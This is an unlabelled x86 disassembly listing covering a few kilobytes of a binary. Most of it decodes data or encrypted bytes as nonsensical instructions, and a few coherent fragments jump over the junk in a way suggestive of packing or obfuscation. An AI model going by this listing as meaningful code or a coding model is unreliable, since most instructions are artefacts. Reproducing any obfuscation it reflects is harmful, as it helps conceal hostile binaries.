  403c6f:	js     0x403ca3
  403c71:	fbld   TBYTE PTR [ebx+eiz*2]
  403c74:	dec    edi
  403c75:	fsubrp st(0),st
  403c77:	sbb    al,0xa0
  403c79:	sbb    eax,DWORD PTR [edi-0x7e]
  403c7c:	call   0xde80:0xc286c2c1
  403c83:	scas   eax,DWORD PTR es:[edi]
  403c84:	imul   edx,DWORD PTR [esi],0xb0bb0cfd
  403c8a:	test   BYTE PTR [ebx],bl
  403c8c:	push   cs
  403c8d:	stos   DWORD PTR es:[edi],eax
  403c8e:	es xchg esp,eax
  403c90:	dec    esp
  403c91:	nop
  403c92:	aas    
  403c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c94:	xor    al,0x65
  403c96:	sbb    cl,dl
  403c98:	not    BYTE PTR [esi]
  403c9a:	mov    ch,0x94
  403c9c:	lock dec edi
  403c9e:	imul   ecx,DWORD PTR [edx],0x3b
  403ca1:	add    al,0x57
  403ca3:	sub    al,0xcf
  403ca5:	mov    ds:0x89a5473e,al
  403caa:	retf   0x95ca
  403cad:	lahf   
  403cae:	leave  
  403caf:	lods   eax,DWORD PTR ds:[esi]
  403cb0:	mov    esp,0xd7a071cc
  403cb5:	sbb    edi,DWORD PTR [esi+ebx*8-0x6]
  403cb9:	stc    
  403cba:	iret   
  403cbb:	mov    cs,WORD PTR [ebx+0x6a7ebe4d]
  403cc1:	fwait
  403cc2:	mov    DWORD PTR [ecx+ebx*2+0x41daa1ac],edi
  403cc9:	inc    edi
  403cca:	scas   eax,DWORD PTR es:[edi]
  403ccb:	sbb    eax,0x61c7a43c
  403cd0:	shl    DWORD PTR [esp+edi*8],cl
  403cd3:	rcr    dl,1
  403cd5:	push   eax
  403cd6:	aam    0x2d
  403cd8:	in     eax,dx
  403cd9:	xor    al,0x4a
  403cdb:	pop    ecx
  403cdc:	dec    ebp
  403cdd:	jbe    0x403d10
  403cdf:	pop    eax
  403ce0:	aaa    
  403ce1:	push   0xc8bd3224
  403ce6:	mov    edi,0xd0ebc4b7
  403ceb:	repz sbb bh,cl
  403cee:	fnstsw WORD PTR [ebp-0x650d8411]
  403cf4:	ja     0x403ce1
  403cf6:	and    al,0x7
  403cf8:	enter  0x3f97,0x37
  403cfc:	or     dl,BYTE PTR [ecx]
  403cfe:	aaa    
  403cff:	(bad)  
  403d00:	out    dx,eax
  403d01:	or     BYTE PTR [esi],bh
  403d03:	sbb    DWORD PTR [edi],eax
  403d05:	in     eax,0xdf
  403d07:	push   0xffffffa7
  403d09:	adc    edi,DWORD PTR [esi]
  403d0b:	ret    0x9aca
  403d0e:	mov    bh,0x3d
  403d10:	xchg   ebp,eax
  403d11:	inc    BYTE PTR [edi]
  403d13:	(bad)  
  403d16:	loope  0x403cb4
  403d18:	cmp    al,0x94
  403d1a:	xchg   DWORD PTR [esi+0x72],esp
  403d1d:	(bad)  
  403d1e:	stos   BYTE PTR es:[edi],al
  403d1f:	xchg   ecx,eax
  403d20:	add    al,0x33
  403d22:	xchg   esp,eax
  403d23:	out    0xdd,eax
  403d25:	(bad)  
  403d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d27:	push   eax
  403d28:	not    DWORD PTR [ebx-0x56]
  403d2b:	nop
  403d2c:	imul   DWORD PTR [ebx+0x6a]
  403d2f:	push   edi
  403d30:	add    eax,0x6cc7c5cb
  403d35:	mov    bh,dl
  403d37:	(bad)  
  403d38:	xchg   esp,eax
  403d39:	and    al,0x2a
  403d3b:	cs inc edx
  403d3d:	pop    ds
  403d3e:	ds ins BYTE PTR es:[edi],dx
  403d40:	cmp    edi,DWORD PTR [ebx+edx*4-0x2076192b]
  403d47:	pop    ebp
  403d48:	(bad)  
  403d49:	add    eax,0x77802c71
  403d4e:	push   0x37
  403d50:	mov    ecx,0x68abc703
  403d55:	adc    ah,ah
  403d57:	jecxz  0x403d16
  403d59:	ins    BYTE PTR es:[edi],dx
  403d5a:	ret    
  403d5b:	enter  0xecd7,0xec
  403d5f:	adc    dh,dl
  403d61:	cmp    eax,0x3219def2
  403d66:	js     0x403d06
  403d68:	jmp    0x403d92
  403d6a:	mov    dh,0xaa
  403d6c:	popa   
  403d6d:	inc    ebp
  403d6e:	and    eax,0x25d16648
  403d73:	adc    edi,DWORD PTR [eax+0xdf93377]
  403d79:	sbb    ah,ch
  403d7b:	pop    ecx
  403d7c:	or     eax,0xde81e1a1
  403d81:	adc    DWORD PTR [eax+0x2d],edi
  403d84:	sub    al,0xb3
  403d86:	rcr    DWORD PTR ds:0x6c56e5e9,1
  403d8c:	cwde   
  403d8d:	or     BYTE PTR [edx+0x32],ch
  403d90:	call   DWORD PTR cs:[ecx]
  403d93:	(bad)  
  403d94:	xchg   esp,eax
  403d95:	scas   al,BYTE PTR es:[edi]
  403d96:	ja     0x403dde
  403d98:	mov    dh,0x34
  403d9a:	icebp  
  403d9b:	push   esp
  403d9c:	mov    ah,0x87
  403d9e:	pusha  
  403d9f:	(bad)  
  403da0:	rcl    BYTE PTR [ebp-0x41217d75],cl
  403da6:	test   al,0x22
  403da8:	push   edi
  403da9:	mov    eax,0xbd624d26
  403dae:	mov    al,0xd6
  403db0:	lahf   
  403db1:	jecxz  0x403d97
  403db3:	mov    bl,0x15
  403db5:	fld    TBYTE PTR [esi+0x5f20f1a1]
  403dbb:	dec    edx
  403dbc:	call   0x53e4:0x81d50207
  403dc3:	cmovs  eax,DWORD PTR [eax+0x564d0038]
  403dca:	inc    edx
  403dcb:	in     al,dx
  403dcc:	inc    ebx
  403dcd:	fld    TBYTE PTR [ebx]
  403dcf:	fsub   DWORD PTR [ebx+0x761ac66a]
  403dd5:	lea    edx,[ebx-0x4253e8ba]
  403ddb:	fistp  DWORD PTR [eax+0xd8fa3ad]
  403de1:	mov    edx,0xbe284f3e
  403de6:	loopne 0x403e67
  403de8:	xor    eax,0xf2172911
  403ded:	jae    0x403dfa
  403def:	mov    bl,0xdd
  403df1:	dec    ecx
  403df2:	pop    ss
  403df3:	or     al,0x43
  403df5:	sahf   
  403df6:	mov    bl,0xe
  403df8:	rcr    BYTE PTR [edi+0x14459556],cl
  403dfe:	cld    
  403dff:	hlt    
  403e00:	pop    esp
  403e01:	mov    ds:0x64b49f66,eax
  403e06:	call   0x1d16aaa2
  403e0b:	or     edx,eax
  403e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e0e:	push   ds
  403e0f:	mov    esp,0x56a08deb
  403e14:	mov    DWORD PTR [ebp+0x401868ad],edi
  403e1a:	out    dx,al
  403e1b:	aam    0xe6
  403e1d:	push   ecx
  403e1e:	xor    al,dl
  403e20:	mov    al,0x4e
  403e22:	ficomp WORD PTR [ecx-0x36]
  403e25:	dec    ebp
  403e26:	scas   al,BYTE PTR es:[edi]
  403e27:	fistp  QWORD PTR [ecx+0xb]
  403e2a:	jo     0x403e1c
  403e2c:	call   0xd49:0x58fe6d23
  403e33:	mov    ds:0xfe1112c9,eax
  403e38:	into   
  403e39:	imul   eax,DWORD PTR [ecx+0x25],0xffffffd1
  403e3d:	int    0xb1
  403e3f:	jl     0x403e34
  403e41:	dec    eax
  403e42:	rcl    BYTE PTR [ebx+0x33],cl
  403e45:	arpl   WORD PTR [eax+0xc],bx
  403e48:	stos   DWORD PTR es:[edi],eax
  403e49:	aam    0x9
  403e4b:	push   ss
  403e4c:	idiv   DWORD PTR [esi-0x62]
  403e4f:	stos   DWORD PTR es:[edi],eax
  403e50:	je     0x403e3a
  403e52:	sbb    edx,ecx
  403e54:	mov    ebp,0x14f2856f
  403e59:	outs   dx,DWORD PTR ds:[esi]
  403e5a:	cmp    ah,BYTE PTR [ecx+edx*1]
  403e5d:	dec    ebp
  403e5e:	lds    esi,FWORD PTR [ebx+eax*8+0x2c2b9e04]
  403e65:	pop    edi
  403e66:	push   ebx
  403e67:	sub    BYTE PTR [ebx+0x37a20d76],dh
  403e6d:	push   esp
  403e6e:	ror    DWORD PTR [edx+0x759e14e2],1
  403e74:	pop    edx
  403e75:	sbb    bl,al
  403e77:	mov    ds:0xfecc34d6,eax
  403e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e7d:	sbb    dl,ah
  403e7f:	(bad)  
  403e80:	repnz leave 
  403e82:	rcr    DWORD PTR [edx],cl
  403e84:	and    DWORD PTR [bp-0x74],ecx
  403e88:	xor    al,BYTE PTR [edx+0x56863869]
  403e8e:	rcr    cl,0x90
  403e91:	es js  0x403e78
  403e94:	arpl   WORD PTR [edi-0x293d035],sp
  403e9a:	stc    
  403e9b:	jns    0x403e46
  403e9d:	addr16 repnz pop edx
  403ea0:	cmp    eax,0xf0999aa6
  403ea5:	cmp    bl,cl
  403ea7:	inc    edi
  403ea8:	addr16 out dx,al
  403eaa:	(bad)
  403eae:	push   esi
  403eaf:	imul   DWORD PTR [esi-0x10]
  403eb2:	and    al,0x81
  403eb4:	adc    dl,dl
  403eb6:	sub    bh,0xbc
  403eb9:	xchg   edx,eax
  403eba:	test   eax,0x5bf370eb
  403ebf:	lea    edx,[edx]
  403ec1:	sub    al,0x3f
  403ec3:	jb     0x403f11
  403ec5:	rcl    eax,cl
  403ec7:	pop    esp
  403ec8:	pop    ebx
  403ec9:	sbb    eax,DWORD PTR [ecx]
  403ecb:	jne    0x403eae
  403ecd:	ror    bl,1
  403ecf:	lods   eax,DWORD PTR ds:[esi]
  403ed0:	lods   al,BYTE PTR ds:[esi]
  403ed1:	xor    esi,edi
  403ed3:	pushf  
  403ed4:	jmp    0x2235:0x1ca6e1c
  403edb:	(bad)  
  403edc:	adc    ecx,esp
  403ede:	mov    al,0xf1
  403ee0:	test   eax,0x84e237b5
  403ee5:	push   ebp
  403ee6:	push   esi
  403ee7:	jmp    0xd187:0x556e0b90
  403eee:	icebp  
  403eef:	mov    cl,BYTE PTR [eax-0x8]
  403ef2:	mov    bh,BYTE PTR [ebp+0x47a9e6c9]
  403ef8:	aaa    
  403ef9:	sub    eax,0x9e790d50
  403efe:	aas    
  403eff:	push   ecx
  403f00:	mov    edi,0x37817744
  403f05:	std    
  403f06:	mov    bh,0xaf
  403f08:	inc    esp
  403f09:	shl    esi,1
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x42814f,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281cf
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42835b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428217,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x758cd5bc],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    bh,cl
  403f62:	or     eax,0x8806de7f
  403f67:	mov    ah,dl
  403f69:	ins    DWORD PTR es:[edi],dx
  403f6a:	push   0x1c
  403f6c:	bound  eax,QWORD PTR [ecx-0x33]
  403f6f:	aaa    
  403f70:	scas   al,BYTE PTR es:[edi]
  403f71:	or     DWORD PTR [ebx],esi
  403f73:	in     al,dx
  403f74:	stos   BYTE PTR es:[edi],al
  403f75:	stc    
  403f76:	mov    bh,BYTE PTR [edx-0x2d]
  403f79:	fild   DWORD PTR [eax]
  403f7b:	adc    BYTE PTR [eax+0x68],ah
  403f7e:	adc    al,0x1b
  403f80:	test   BYTE PTR [eax],dh
  403f82:	es call 0x91bf:0xf3f97b91
  403f8a:	inc    esp
  403f8b:	mov    DWORD PTR ds:0x30e52352,eax
  403f91:	jb     0x404003
  403f93:	je     0x403f83
  403f95:	cmp    bh,BYTE PTR [edx+0x7f]
  403f98:	loopne 0x403fe8
  403f9a:	mov    esp,0xd50b66e6
  403f9f:	push   0xf6dc2c63
  403fa4:	fisttp DWORD PTR ds:0xfb80e5ee
  403faa:	fbld   TBYTE PTR [edx]
  403fac:	cmp    eax,0x5f8758d7
  403fb1:	push   0xdd6d23c7
  403fb6:	cmp    DWORD PTR [edi-0x3728e6d6],ebp
  403fbc:	sti    
  403fbd:	enter  0xf916,0x79
  403fc1:	jl     0x403f4c
  403fc3:	or     DWORD PTR [ebp+0x38658022],0xcfbe3364
  403fcd:	into   
  403fce:	mov    ecx,0x33370175
  403fd3:	outs   dx,DWORD PTR ds:[esi]
  403fd4:	lea    ecx,[edi-0x60]
  403fd7:	or     BYTE PTR [bx-0x507],dh
  403fdc:	sar    BYTE PTR [edi-0x747fff8c],cl
  403fe2:	sti    
  403fe3:	jbe    0x403ff9
  403fe5:	jecxz  0x404021
  403fe7:	pop    edi
  403fe8:	push   ecx
  403fe9:	sub    bh,BYTE PTR [ecx+0x2b256520]
  403fef:	xchg   ebp,eax
  403ff0:	jae    0x404016
  403ff2:	sbb    BYTE PTR [ebx],ah
  403ff4:	lods   eax,DWORD PTR ds:[esi]
  403ff5:	cwde   
  403ff6:	or     bl,bl
  403ff8:	sub    eax,0xe7ba1659
  403ffd:	ja     0x404060
  403fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404000:	arpl   WORD PTR [ebp+0x6e],sp
  404003:	jne    0x404036
  404005:	or     eax,0xc4a68452
  40400a:	in     al,dx
  40400b:	cmp    cl,BYTE PTR ds:0x2601b4ea
  404011:	push   0x3e23776d
  404016:	(bad)  
  404017:	mov    edi,0x959bce0b
  40401c:	test   al,0x4e
  40401e:	pop    esi
  40401f:	ds call 0xb4535758
  404025:	sub    BYTE PTR [ebx],bh
  404027:	xchg   BYTE PTR [edi+0x1a7a8069],dh
  40402d:	lock sub BYTE PTR [eax-0x7e],cl
  404031:	je     0x40409d
  404033:	ror    BYTE PTR [edi-0x4dda35a7],cl
  404039:	in     eax,0x32
  40403b:	jl     0x403ff6
  40403d:	out    0x12,eax
  40403f:	adc    eax,0xe9aea9cc
  404044:	outs   dx,BYTE PTR ds:[esi]
  404045:	lds    edi,FWORD PTR [ebx-0x48]
  404048:	xchg   ecx,eax
  404049:	sbb    eax,0xb4e3cd71
  40404e:	sbb    bl,BYTE PTR [ebp+0x3]
  404051:	pop    DWORD PTR [esi-0x2193dbe9]
  404057:	pop    ebx
  404058:	push   cs
  404059:	xlat   BYTE PTR ds:[ebx]
  40405a:	out    dx,al
  40405b:	pop    ebp
  40405c:	lock xlat BYTE PTR ds:[ebx]
  40405e:	out    dx,al
  40405f:	mov    dh,0x70
  404061:	mov    ecx,0x95b48ea9
  404066:	mov    cs,WORD PTR [edi-0x3a043906]
  40406c:	mov    DWORD PTR [esi-0x51],ecx
  40406f:	and    ch,BYTE PTR [edx-0x2b]
  404072:	or     BYTE PTR [edi],ah
  404074:	push   eax
  404075:	(bad)  
  404076:	xchg   ecx,eax
  404077:	fnstcw WORD PTR [ecx-0x11722716]
  40407d:	pop    esi
  40407e:	sbb    cl,BYTE PTR [ebx-0x1cfc39d1]
  404084:	xlat   BYTE PTR ds:[ebx]
  404085:	jne    0x4040a5
  404087:	mul    ebp
  404089:	jno    0x404021
  40408b:	dec    ebp
  40408c:	out    0x41,al
  40408e:	les    edi,FWORD PTR [ebx+0x67ad9338]
  404094:	mov    DWORD PTR [esi+0x37],0xd6f83e88
  40409b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40409c:	cmp    DWORD PTR [ecx+ebp*4+0x3e],ebp
  4040a0:	mov    esi,0xf2356974
  4040a5:	test   DWORD PTR [ecx+eiz*1],ebp
  4040a8:	mov    ebp,0xc1174085
  4040ad:	cmp    al,0xbe
  4040af:	imul   esi,DWORD PTR [ebx+0x61],0x85f7743b
  4040b6:	adc    ch,BYTE PTR [edx-0x7f61fe28]
  4040bc:	fisttp DWORD PTR [esi-0x5ec7c523]
  4040c2:	outs   dx,DWORD PTR ds:[esi]
  4040c3:	mov    bl,0x34
  4040c5:	retf   
  4040c6:	mov    bl,0x9f
  4040c8:	pushf  
  4040c9:	jg     0x40407f
  4040cb:	or     DWORD PTR [edi],ebx
  4040cd:	cmp    DWORD PTR [edi],esi
  4040cf:	mov    bl,0x40
  4040d1:	cwde   
  4040d2:	bound  eax,QWORD PTR [edi+0x6d]
  4040d5:	xchg   BYTE PTR [edx+0x370191e7],al
  4040db:	gs sti 
  4040dd:	imul   ecx,DWORD PTR ds:0x328bb3aa,0xffffff87
  4040e4:	nop
  4040e5:	out    0x93,al
  4040e7:	add    ebx,DWORD PTR [edx+0x7d]
  4040ea:	sub    BYTE PTR [edi],dh
  4040ec:	fstp   TBYTE PTR [edi+0x4b]
  4040ef:	sti    
  4040f0:	or     eax,0x73ff5389
  4040f5:	out    0xb3,al
  4040f7:	add    DWORD PTR [eax-0x13393161],eax
  4040fd:	fisub  WORD PTR [ebx]
  4040ff:	mov    eax,ds:0x737840c2
  404104:	fist   WORD PTR [edi+0x1c35635a]
  40410a:	cli    
  40410b:	dec    edx
  40410c:	push   es
  40410d:	lds    ecx,FWORD PTR [ecx+esi*1]
  404110:	dec    edi
  404111:	dec    ecx
  404112:	jl     0x4040bf
  404114:	ja     0x404098
  404116:	rcl    DWORD PTR [eax-0x23d913ff],cl
  40411c:	cmp    dh,BYTE PTR [ebx]
  40411e:	test   BYTE PTR [ecx],0x4a
  404121:	stos   DWORD PTR es:[edi],eax
  404122:	outs   dx,BYTE PTR ds:[esi]
  404123:	jo     0x4040a8
  404125:	shl    BYTE PTR [ebx],1
  404127:	or     ch,al
  404129:	sti    
  40412a:	mov    bh,0xdd
  40412c:	xor    ah,BYTE PTR [ecx]
  40412e:	aad    0xcd
  404130:	jnp    0x404122
  404132:	mov    bh,0x69
  404134:	and    eax,0x40e549fb
  404139:	push   esp
  40413a:	sub    esi,DWORD PTR [esi-0x3f]
  40413d:	call   0x2044:0x8504a2a7
  404144:	mov    ds:0xd2885e9b,eax
  404149:	adc    DWORD PTR [ebp-0xf],ecx
  40414c:	fisub  DWORD PTR [ebx]
  40414e:	xchg   ebx,eax
  40414f:	sub    eax,0xa84d8d6a
  404154:	arpl   cx,sp
  404156:	add    ebx,DWORD PTR [ebx+0x3e]
  404159:	mov    ebp,0xa510bf0d
  40415e:	ret    
  40415f:	inc    edx
  404160:	dec    ecx
  404161:	lods   eax,DWORD PTR ds:[esi]
  404162:	addr16 dec edi
  404164:	pop    ebx
  404165:	push   eax
  404166:	mov    edx,0xcda6d451
  40416b:	push   eax
  40416c:	sub    bh,ah
  40416e:	in     eax,0x50
  404170:	in     eax,0xcd
  404172:	out    dx,al
  404173:	popf   
  404174:	rcr    DWORD PTR [eax+ebp*8-0x54],0xdf
  404179:	mov    esp,0x6d30ba9e
  40417e:	nop
  40417f:	add    BYTE PTR [ebx+0x37888f17],bh
  404185:	mov    eax,ds:0x9d7e899a
  40418a:	test   eax,0x3768066
  40418f:	sub    BYTE PTR [ecx+eiz*8-0x4d317f51],bl
  404196:	cli    
  404197:	xchg   DWORD PTR [ebp+0x1f],esp
  40419a:	sbb    al,0x49
  40419c:	outs   dx,BYTE PTR ds:[esi]
  40419d:	test   ch,bh
  40419f:	inc    ebx
  4041a0:	mov    ecx,0x73cf1d4c
  4041a5:	push   edi
  4041a6:	into   
  4041a7:	dec    ebp
  4041a8:	xchg   edi,eax
  4041a9:	push   edi
  4041aa:	mov    ch,0x6d
  4041ac:	push   esp
  4041ad:	cdq    
  4041ae:	push   0x1a
  4041b0:	inc    sp
  4041b2:	mov    eax,ds:0x671996e4
  4041b7:	mov    ebp,0x7b6ae779
  4041bc:	call   FWORD PTR ds:0x89992f18
  4041c2:	pop    ds
  4041c3:	test   BYTE PTR [ebp-0x76b7cd8a],dl
  4041c9:	clc    
  4041ca:	push   ebx
  4041cb:	adc    bh,BYTE PTR [ebx+0x7d]
  4041ce:	into   
  4041cf:	jmp    0x24a2:0x3aef214e
  4041d6:	or     eax,0xd630dc8a
  4041db:	ins    DWORD PTR es:[edi],dx
  4041dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041dd:	push   es
  4041de:	arpl   WORD PTR [edx-0x57cdb689],sp
  4041e4:	dec    ebx
  4041e5:	jne    0x404180
  4041e7:	fcom   QWORD PTR [ebx]
  4041e9:	sbb    eax,0x96875ee0
  4041ee:	sar    DWORD PTR ds:0xd57d6f62,cl
  4041f4:	pop    ebx
  4041f5:	test   WORD PTR [ecx-0x56fab2e],dx
  4041fc:	pop    esi
  4041fd:	jns    0x40426a
  4041ff:	imul   ebp,DWORD PTR [ebx*4-0x7156f24f],0xc72bde06
  40420a:	mov    bh,0x66
  40420c:	pop    esp
  40420d:	or     eax,0x39d2b629
  404212:	mov    DWORD PTR [esi-0x16f36f],esi
  404218:	sbb    DWORD PTR [ebp-0x6578f030],esp
  40421e:	leave  
  40421f:	stos   DWORD PTR es:[edi],eax
  404220:	fnstsw WORD PTR [ebx+0x39]
  404223:	dec    ebx
  404224:	xchg   edi,eax
  404225:	test   BYTE PTR [ebp-0x3bacd17],ah
  40422b:	adc    ebx,eax
  40422d:	data16 fiadd WORD PTR [edx-0x41]
  404231:	sbb    eax,0xe4f393f2
  404236:	push   esp
  404237:	addr16 lahf 
  404239:	xchg   edx,eax
  40423a:	mov    DWORD PTR [ebx],edi
  40423c:	mov    esp,0xfb10af63
  404241:	out    dx,eax
  404242:	iret   
  404243:	pushf  
  404244:	out    dx,al
  404245:	and    al,0x5f
  404247:	(bad)  
  404248:	fbld   TBYTE PTR [edx+0x51d52c66]
  40424e:	mov    ds:0x7ab8bf6f,al
  404253:	rcl    DWORD PTR [ebx+0x7d19a9a5],1
  404259:	fdecstp 
  40425b:	push   edx
  40425c:	mov    ah,0xc
  40425e:	and    esi,DWORD PTR [edi]
  404260:	call   0x84e8:0xd8b3daaa
  404267:	sbb    al,BYTE PTR ds:0x8bd7f5d3
  40426d:	(bad)  
  40426e:	xor    eax,0xbbda0a11
  404273:	nop
  404274:	daa    
  404275:	(bad)  
  404276:	or     eax,ebp
  404278:	scas   al,BYTE PTR es:[edi]
  404279:	loop   0x4042a9
  40427b:	dec    edi
  40427c:	add    ecx,DWORD PTR [esi+0x58e70bb5]
  404282:	mov    bh,0x92
  404284:	xchg   ebx,eax
  404285:	jge    0x4042fd
  404287:	es dec edi
  404289:	mov    dl,0xac
  40428b:	and    BYTE PTR [ecx],bh
  40428d:	std    
  40428e:	dec    ebx
  40428f:	pop    ss
  404290:	xchg   BYTE PTR [ebp+0x42],ch
  404293:	out    0xb8,al
  404295:	ret    0x6e0e
  404298:	inc    edx
  404299:	push   es
  40429a:	pop    es
  40429b:	les    edi,FWORD PTR [ebp+0x351792a4]
  4042a1:	sub    bl,BYTE PTR [ecx]
  4042a3:	test   BYTE PTR [edx],bh
  4042a5:	and    BYTE PTR [eax-0x1],0x6a
  4042a9:	mov    ah,BYTE PTR fs:[eax+edi*8]
  4042ad:	jl     0x404327
  4042af:	cmp    ecx,DWORD PTR [edi]
  4042b1:	mov    dh,dh
  4042b3:	fs mov cl,0xeb
  4042b6:	sahf   
  4042b7:	aad    0x6d
  4042b9:	in     al,0x9
  4042bb:	frstor [ebx]
  4042bd:	lods   eax,DWORD PTR ds:[esi]
  4042be:	pushf  
  4042bf:	sbb    DWORD PTR [edx-0x515fd136],ebp
  4042c5:	and    esi,DWORD PTR [eax-0x226941a6]
  4042cb:	jne    0x404252
  4042cd:	xor    eax,0xaeb7b3a7
  4042d2:	sbb    BYTE PTR [eax],ch
  4042d4:	add    ah,BYTE PTR [ecx+ebp*1]
  4042d7:	(bad)  
  4042d8:	es imul ebp,esi,0x15
  4042dc:	outs   dx,DWORD PTR ds:[esi]
  4042dd:	aam    0xd
  4042df:	imul   ebp,DWORD PTR [ebp-0x66],0x36af675e
  4042e6:	das    
  4042e7:	jnp    0x40432b
  4042e9:	mul    ecx
  4042eb:	pop    es
  4042ec:	lods   eax,DWORD PTR ds:[esi]
  4042ed:	loop   0x40428a
  4042ef:	add    eax,0x42b40fb5
  4042f4:	das    
  4042f5:	push   edi
  4042f6:	xor    al,0xf7
  4042f8:	bound  esi,QWORD PTR [esi]
  4042fa:	add    DWORD PTR [ebx-0x7f],ecx
  4042fd:	jmp    0x4042f7
  4042ff:	mov    bh,BYTE PTR [edx-0x65bb3f04]
  404305:	out    dx,eax
  404306:	pop    ebx
  404307:	stos   BYTE PTR es:[edi],al
  404308:	add    dl,BYTE PTR [ecx]
  40430a:	lock inc ebx
  40430c:	es popa 
  40430e:	push   edx
  40430f:	repnz not BYTE PTR [ecx]
  404312:	jbe    0x4042f9
  404314:	call   0xdd39:0x673fd24b
  40431b:	stos   DWORD PTR es:[edi],eax
  40431c:	add    al,0x1d
  40431e:	push   ds
  40431f:	jg     0x40437b
  404321:	les    ecx,FWORD PTR [ebx+0x1d210453]
  404327:	sbb    eax,DWORD PTR [edx-0x30ccffbe]
  40432d:	or     edx,DWORD PTR ds:0x42824b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282c7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428207
  404344:	and    DWORD PTR ds:0x428367,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42834f
  404355:	sbb    DWORD PTR ds:0x42825b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	(bad)  
  404370:	pop    esp
  404371:	iret   
  404372:	jo     0x4043c9
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [esi+0x130f74a],ah
  404380:	mov    ch,0xca
  404382:	dec    ebx
  404383:	sub    al,0xde
  404385:	ds call 0xaad3:0xc14cca18
  40438d:	and    DWORD PTR [ebx-0x44],ecx
  404390:	test   al,0xf
  404392:	in     al,0xa6
  404394:	shl    BYTE PTR [esp+edx*4-0x57],1
  404398:	dec    edx
  404399:	imul   edi,DWORD PTR [edx-0x3e],0xffffff99
  40439d:	or     BYTE PTR [eax+0x45],bl
  4043a0:	push   esi
  4043a1:	jle    0x40433a
  4043a3:	add    DWORD PTR [ebx+0x5a],ebp
  4043a6:	out    dx,al
  4043a7:	mov    cl,0xf8
  4043a9:	pop    edi
  4043aa:	iret   
  4043ab:	dec    esp
  4043ac:	pop    ebp
  4043ad:	sub    DWORD PTR [edi],edi
  4043af:	call   0xed81e4c1
  4043b4:	pop    ebp
  4043b5:	imul   BYTE PTR ds:0x6988a3f1
  4043bb:	cmp    al,0xd
  4043bd:	fiadd  DWORD PTR [edi-0x51]
  4043c0:	sub    ebp,DWORD PTR [edi+eax*8]
  4043c3:	aad    0x9d
  4043c5:	inc    esi
  4043c6:	or     al,0xa7
  4043c8:	sub    al,0xfc
  4043ca:	bound  ebp,QWORD PTR [ebp-0x5]
  4043cd:	dec    ebx
  4043ce:	rcl    DWORD PTR [eax-0xc],0x91
  4043d2:	cmp    BYTE PTR [edi+eax*1+0x3],0x3c
  4043d7:	push   cs
  4043d8:	dec    edi
  4043d9:	xchg   ebx,eax
  4043da:	ret    
  4043db:	or     DWORD PTR [ebp+eax*1-0x11],0xffffff96
  4043e0:	(bad)  [esi+0x66508079]
  4043e6:	dec    eax
  4043e7:	sar    BYTE PTR [ebx+0x384dde2],0x5e
  4043ee:	dec    esp
  4043ef:	mov    ds:0xeaae6eb2,al
  4043f4:	call   ebx
  4043f6:	inc    ecx
  4043f7:	adc    edi,DWORD PTR [eax+0x7b45ff2a]
  4043fd:	cmp    esp,DWORD PTR [edi+0x469d9d16]
  404403:	xor    al,dh
  404405:	mov    al,ds:0xe39b7b28
  40440a:	clc    
  40440b:	inc    eax
  40440c:	in     eax,dx
  40440d:	stos   BYTE PTR es:[edi],al
  40440e:	leave  
  40440f:	xor    esp,DWORD PTR [esp+ebp*1+0x16e4c51f]
  404416:	std    
  404417:	leave  
  404418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404419:	inc    ebp
  40441a:	sub    esi,edi
  40441c:	push   edx
  40441d:	inc    eax
  40441e:	xor    esi,DWORD PTR [eax+0x4a]
  404421:	add    al,0x80
  404423:	jmp    0x8a54:0xcbeba8ed
  40442a:	iret   
  40442b:	mov    gs,WORD PTR [esi-0x2b]
  40442e:	xchg   ecx,eax
  40442f:	push   ds
  404430:	xchg   BYTE PTR [ecx-0x393a3e5c],bh
  404436:	(bad)  
  404437:	sbb    ebp,DWORD PTR [esi]
  404439:	inc    ebp
  40443a:	mov    edi,0x2d782aeb
  40443f:	jo     0x4044bb
  404441:	sahf   
  404442:	jmp    0xcc8a:0x27b0c837
  404449:	inc    esp
  40444a:	out    0x0,eax
  40444c:	push   esp
  40444d:	add    ch,ah
  40444f:	pop    edx
  404450:	(bad)  
  404451:	repnz add si,WORD PTR [edi-0x17]
  404456:	fmul   QWORD PTR [ebx]
  404458:	xor    dl,BYTE PTR [ecx+0x64385ace]
  40445e:	jl     0x404480
  404460:	je     0x40441f
  404462:	xor    BYTE PTR [ebx-0x2549d7bc],bh
  404468:	mov    dl,0xd9
  40446a:	hlt    
